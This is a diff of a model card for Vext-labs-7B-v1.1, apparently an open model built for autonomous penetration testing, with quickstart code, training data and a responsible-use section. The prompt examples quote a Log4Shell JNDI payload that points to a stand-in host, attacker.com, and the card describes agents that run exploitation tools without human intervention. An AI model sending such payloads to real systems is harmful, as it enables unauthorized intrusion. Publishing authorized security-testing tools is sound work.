@@ -1,71 +1,90 @@
 <p align="center">
-  <img src="https://vext.ai/logo.png" alt="VEXT AI" width="200"/>
+  <img src="assets/vext-wordmark.png" alt="VEXT" width="280"/>
 </p>
 
 <h1 align="center">Vext-labs-7B-v1.1</h1>
-<p align="center"><strong>Autonomous Security Testing Model</strong></p>
+<p align="center"><strong>The first open-source language model purpose-built for autonomous penetration testing.</strong></p>
 
 <p align="center">
-  <a href="https://vext.ai">Website</a> |
-  <a href="https://huggingface.co/vext-ai/Vext-labs-7B-v1.1">HuggingFace</a> |
+  <a href="https://tryvext.com">Website</a> |
   <a href="#quickstart">Quickstart</a> |
+  <a href="#capabilities">Capabilities</a> |
   <a href="#benchmarks">Benchmarks</a>
 </p>
 
 ---
 
-A security-specialized language model by **VEXT AI** for autonomous penetration testing and vulnerability assessment.
+## Overview
 
-Built as a LoRA adapter on [Qwen/Qwen2.5-7B-Instruct](https://huggingface.co/Qwen/Qwen2.5-7B-Instruct), fine-tuned on real-world security testing data including tool output interpretation, attack planning, vulnerability classification, and remediation guidance.
+**Vext-labs-7B-v1.1** is a 7-billion parameter language model created by [Vext Labs Inc.](https://tryvext.com) for autonomous security testing. It is trained to reason about security tool output, plan multi-step attack strategies, classify vulnerabilities, and generate remediation guidance.
 
-## What This Model Does
+This model powers the [VEXT](https://tryvext.com) autonomous penetration testing platform, where it drives agents that execute real security tools (nuclei, dalfox, sqlmap, gobuster, and 20+ others) against authorized targets with zero human intervention.
 
-Vext-labs-7B-v1.1 is trained on data from the VEXT autonomous security testing platform:
+## Capabilities
 
-- **Interpret security tool output** — Parse and reason about results from nuclei, dalfox, sqlmap, gobuster, naabu, and 20+ other security tools
-- **Plan attack strategies** — Given a target scope and reconnaissance data, decide which tools to run and in what order
-- **Classify vulnerabilities** — Distinguish true positives from false positives
-- **Generate remediation advice** — Provide actionable fix recommendations for discovered vulnerabilities
+Vext-labs-7B-v1.1 excels at four core security tasks:
+
+- **Tool Output Interpretation** — Parse and reason about raw output from 25+ security tools including nuclei, dalfox, sqlmap, gobuster, naabu, katana, httpx, subfinder, and more
+- **Attack Strategy Planning** — Given a target scope and reconnaissance data, determine which tools to run, in what order, and with what parameters
+- **Vulnerability Classification** — Distinguish true positives from false positives with high accuracy, reducing noise for security teams
+- **Remediation Guidance** — Generate actionable fix recommendations for discovered vulnerabilities
 
 ## Quickstart
 
-### With vLLM (Recommended)
+### With vLLM (Recommended for Production)
 
 ```bash
 pip install vllm
 
 python -m vllm.entrypoints.openai.api_server \
-    --model Qwen/Qwen2.5-7B-Instruct \
-    --enable-lora \
-    --lora-modules vext-security-v1=./adapter \
-    --max-lora-rank 32
+    --model Vext-Labs-Inc/Vext-labs-7B-v1.1 \
+    --trust-remote-code
 ```
 
-### With PEFT + Transformers
+Then use the OpenAI-compatible API:
 
 ```python
-from peft import PeftModel
+from openai import OpenAI
+
+client = OpenAI(base_url="http://localhost:8000/v1", api_key="unused")
+
+response = client.chat.completions.create(
+    model="Vext-Labs-Inc/Vext-labs-7B-v1.1",
+    messages=[
+        {
+            "role": "system",
+            "content": "You are an autonomous security testing agent. Analyze tool output and decide next actions."
+        },
+        {
+            "role": "user",
+            "content": """Nuclei scan results:
+[critical] CVE-2021-44228 Log4Shell detected at /api/login
+POC: ${jndi:ldap://attacker.com/a}
+
+What is this vulnerability and what should I do next?"""
+        }
+    ],
+    temperature=0.3,
+    max_tokens=512
+)
+print(response.choices[0].message.content)
+```
+
+### With Transformers
+
+```python
 from transformers import AutoModelForCausalLM, AutoTokenizer
 
-base = AutoModelForCausalLM.from_pretrained(
-    "Qwen/Qwen2.5-7B-Instruct",
+model = AutoModelForCausalLM.from_pretrained(
+    "Vext-Labs-Inc/Vext-labs-7B-v1.1",
     torch_dtype="auto",
     device_map="auto"
 )
-model = PeftModel.from_pretrained(base, "vext-ai/Vext-labs-7B-v1.1")
-tokenizer = AutoTokenizer.from_pretrained("vext-ai/Vext-labs-7B-v1.1")
+tokenizer = AutoTokenizer.from_pretrained("Vext-Labs-Inc/Vext-labs-7B-v1.1")
 
 messages = [
-    {
-        "role": "system",
-        "content": "You are a security testing agent. Analyze the tool output and identify vulnerabilities."
-    },
-    {
-        "role": "user",
-        "content": """Nuclei scan results:
-[critical] CVE-2021-44228 Log4Shell detected at /api/login
-POC: ${jndi:ldap://attacker.com/a}"""
-    }
+    {"role": "system", "content": "You are a security testing agent."},
+    {"role": "user", "content": "Gobuster found /admin, /api/v1, /backup. Plan the next steps."}
 ]
 
 text = tokenizer.apply_chat_template(messages, tokenize=False, add_generation_prompt=True)
@@ -74,34 +93,31 @@ output = model.generate(**inputs, max_new_tokens=512)
 print(tokenizer.decode(output[0], skip_special_tokens=True))
 ```
 
-## Training Details
+## Training
 
 | Parameter | Value |
 |-----------|-------|
-| Base model | `Qwen/Qwen2.5-7B-Instruct` |
-| Method | LoRA (Low-Rank Adaptation) |
-| Rank | 32 |
-| Alpha | 64 |
-| Target modules | `q_proj, k_proj, v_proj, o_proj, gate_proj, up_proj, down_proj` |
+| Parameters | 7B |
 | Training steps | 5,000 |
 | Training samples | 436,922 |
 | Final loss | 0.51 |
 | Precision | bfloat16 |
+| Context length | 8,192 tokens |
 
 ### Training Data
 
-Fine-tuned on security testing data generated by the VEXT platform:
+Trained on security testing data generated by the VEXT autonomous pentesting platform:
 
-- **Tool execution traces** — input parameters, raw output, parsed results from 25+ security tools
-- **Attack planning decisions** — which tool to use, why, expected outcomes
-- **Vulnerability validation** — true positive vs false positive classification with evidence
-- **Multi-step attack chains** — reconnaissance through enumeration through exploitation
+- **Tool execution traces** — Input parameters, raw stdout/stderr, parsed results, and exit codes from 25+ security tools
+- **Attack planning decisions** — Which tool to run next, why, and what parameters to use based on current context
+- **Vulnerability validation** — True positive vs false positive classification with supporting evidence chains
+- **Multi-step attack chains** — Full reconnaissance-to-exploitation sequences with reasoning at each step
 
-Data collected from authorized testing against intentionally vulnerable applications (OWASP Juice Shop, DVWA, bWAPP, WebGoat, and others) and authorized bug bounty targets.
+Data was collected from authorized testing against intentionally vulnerable applications (OWASP Juice Shop, DVWA, bWAPP, WebGoat, and others) and authorized bug bounty targets.
 
 ## Benchmarks
 
-Results from Juice Shop CTF evaluation (v1.1 model driving 3 autonomous agents):
+Results from the Juice Shop CTF evaluation (v1.1 model driving 3 autonomous agents):
 
 | Metric | Result |
 |--------|--------|
@@ -110,17 +126,7 @@ Results from Juice Shop CTF evaluation (v1.1 model driving 3 autonomous agents):
 | False positive rate | TBD |
 | Time to first finding | TBD |
 
-*Benchmarks will be updated after the POC evaluation run completes.*
-
-## Model Files
-
-```
-adapter_config.json          # PEFT/LoRA configuration
-adapter_model.safetensors    # LoRA weight deltas (~308 MB)
-tokenizer.json               # Full tokenizer vocabulary
-tokenizer_config.json        # Tokenizer settings
-chat_template.jinja           # Chat template for inference
-```
+*Benchmarks will be updated after the evaluation run completes.*
 
 ## Responsible Use
 
@@ -128,28 +134,26 @@ This model is intended for **authorized security testing only**:
 
 - Within the scope of authorized penetration testing engagements
 - Against applications you own or have explicit written permission to test
-- In CTF competitions and security training environments
+- In CTF (Capture the Flag) competitions and security training environments
 - For defensive security research and vulnerability assessment
 
 **Do not use this model for unauthorized access to computer systems.**
 
-## About VEXT AI
+## About Vext Labs
 
-VEXT is building autonomous security testing agents that combine LLM reasoning with real security tools. Our agents run full penetration tests — from reconnaissance to exploitation to reporting — with human-level decision making.
-
-Learn more at [vext.ai](https://vext.ai)
+[Vext Labs Inc.](https://tryvext.com) builds autonomous security testing agents that combine LLM reasoning with real security tools. Our agents run full penetration tests — from reconnaissance to exploitation to reporting — with human-level decision making.
 
 ## License
 
-Apache 2.0
+Apache 2.0 — See [LICENSE](LICENSE) for details.
 
 ## Citation
 
 ```bibtex
 @misc{vext-labs-7b-v1.1,
-  title={Vext-labs-7B-v1.1: Security-Specialized Language Model for Autonomous Penetration Testing},
-  author={VEXT AI},
+  title={Vext-labs-7B-v1.1: A Language Model for Autonomous Penetration Testing},
+  author={Vext Labs Inc.},
   year={2026},
-  url={https://github.com/vext-ai/Vext-labs-7B-v1.1}
+  url={https://github.com/Vext-Labs-Inc/Vext-labs-7B-v1.1-}
 }
 ```
